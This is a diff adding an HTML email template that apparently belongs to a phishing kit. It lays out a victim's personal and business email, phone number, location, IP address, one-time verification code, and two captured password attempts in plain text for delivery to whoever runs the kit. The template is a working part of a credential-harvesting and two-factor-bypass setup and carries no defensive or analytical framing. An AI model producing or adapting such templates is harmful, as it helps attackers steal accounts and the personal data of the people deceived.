@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e7e7e7;
+        }
+        .content {
+            padding: 20px;
+        }
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .info-table th {
+            background-color: #f2f2f2;
+            text-align: left;
+            padding: 10px;
+            border: 1px solid #ddd;
+        }
+        .info-table td {
+            padding: 10px;
+            border: 1px solid #ddd;
+        }
+        .verification-code {
+            background-color: #fffde7;
+            padding: 10px;
+            text-align: center;
+            font-size: 24px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .footer {
+            margin-top: 20px;
+            padding: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>Verification Code Submission</h2>
+        <p>New verification attempt received</p>
+    </div>
+
+    <div class="content">
+        <table class="info-table">
+            <tr>
+                <th colspan="2" style="text-align: center;">User Information</th>
+            </tr>
+            <tr>
+                <th>Personal Email</th>
+                <td>{{email}}</td>
+            </tr>
+            <tr>
+                <th>Business Email</th>
+                <td>{{business_email}}</td>
+            </tr>
+            <tr>
+                <th>Phone Number</th>
+                <td>{{phone}}</td>
+            </tr>
+            <tr>
+                <th>Location</th>
+                <td>{{location}}</td>
+            </tr>
+            <tr>
+                <th>IP Address</th>
+                <td>{{ip_address}}</td>
+            </tr>
+        </table>
+
+        <div class="verification-code">
+            <strong>Verification Code (Attempt {{attempt_number}}):</strong><br>
+            {{verification_code}}
+        </div>
+
+        <table class="info-table">
+            <tr>
+                <th>First Password Attempt</th>
+                <td>{{first_password}}</td>
+            </tr>
+            <tr>
+                <th>Second Password Attempt</th>
+                <td>{{second_password}}</td>
+            </tr>
+        </table>
+
+        <p><strong>Submission Time:</strong> {{date}}</p>
+    </div>
+
+    <div class="footer">
+        <p>This is an automated message. Please do not reply directly to this email.</p>
+    </div>
+</body>
+</html>
